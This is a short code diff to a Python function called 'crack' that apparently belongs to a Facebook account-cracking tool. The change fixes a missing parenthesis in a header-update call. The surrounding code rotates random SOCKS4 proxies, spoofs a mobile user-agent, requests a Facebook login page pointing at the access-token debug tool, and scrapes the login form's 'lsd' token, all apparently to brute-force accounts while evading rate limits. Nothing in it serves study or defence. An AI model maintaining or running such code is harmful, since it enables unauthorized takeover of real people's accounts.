@@ -473,7 +473,7 @@ def crack(idf,pwv):
 		try:
 			nip=random.choice(prox)
 			proxs= {'http': 'socks4://'+nip}
-			ses.headers.update{
+			ses.headers.update({
                     "Host":cebok,
                     "upgrade-insecure-requests":"1",
                     "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
@@ -487,7 +487,7 @@ def crack(idf,pwv):
                     "referer":"https://m.facebook.com/",
                     "accept-encoding":"gzip, deflate br",
                     "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
-                }
+                })
                 r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                 das = {
                     "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
